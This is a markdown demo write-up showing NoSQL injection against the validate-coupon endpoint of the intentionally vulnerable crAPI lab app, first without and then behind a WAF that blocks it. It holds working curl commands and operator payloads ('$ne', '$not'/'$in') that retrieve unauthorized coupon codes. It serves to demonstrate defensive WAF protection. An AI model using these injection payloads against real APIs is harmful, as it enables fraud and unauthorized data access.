## Demo Overview
 Abusing the coupon endpoint with `NoSQL` to get unauthorized coupons

---
### Setup:
Testing with two hostnames 

**crapi.local** |  crAPI Application protected by WAF
  
**10.1.10.104** | crAPI Application Without WAF

### Users:
**Malicious User:** malicious@example.com/F5@Pass50

## Discovering Coupon Endpoint
 Find a way to get free coupons without knowing the coupon code.
 We initiated the challenge by intercepting the validate-coupon request in postman.

<img width="1176" height="974" alt="image" src="https://github.com/user-attachments/assets/1ab71876-fd60-4565-a075-ee44de1d2d73" />
<img width="1303" height="655" alt="image" src="https://github.com/user-attachments/assets/47b17bfe-b03b-45ef-a9ef-60f8cf32d031" />

## NoSQL Without WAF
- We will use the curl command to craft requests, and review the responses of `coupon` endpoint
- Try  many possible NoSQL queries that result in NoSQL Injection.
Some of the most used NoSQL queries are provided below:
>	- $ne
>	- $in
>	- $gt
>	- $lt
>	- $where
>	- $and

- `{"$ne": null}` worked and provided a new coupon
```zsh unfold ln:false unwrap title:"code"
##login and export access token
export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
#get coupon
curl -X POST  http://10.1.10.104/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$ne": null}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
<img width="2495" height="227" alt="image" src="https://github.com/user-attachments/assets/b1ce9062-3645-4f15-8de9-f1df07845af8" />

received an coupon `TRAC075`

- using `$not `and `$in`to get another coupon
```zsh unfold ln:false unwrap title:"code"
curl -X POST  http://10.1.10.104/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$not": {"$in":["TRAC075"]}}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```
<img width="2488" height="226" alt="image" src="https://github.com/user-attachments/assets/a5f4a1c5-38ee-4aeb-bf44-670eb28077fd" />
another coupon `TRAC065`, so with more digging er can get more unauthorized coupons

## With WAF Protection 
- login and try same previous NoSQL requests
```zsh unfold ln:false unwrap title:"code"
export token=$(curl -X POST http://crapi.local/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
curl -X POST  http://crapi.local/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$ne": null}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```

```zsh unfold ln:false unwrap title:"code"
curl -X POST  http://crapi.local/community/api/v2/coupon/validate-coupon -d '{"coupon_code":{"$not": {"$in":["TRAC075"]}}}' -H "Authorization: Bearer $token" -H "Content-Type: application/json"
```

<img width="2495" height="358" alt="image" src="https://github.com/user-attachments/assets/1c68f2ef-8496-4ce0-b677-cdbf8b2fb6fa" />
Both nosql requests blocked by WAF.



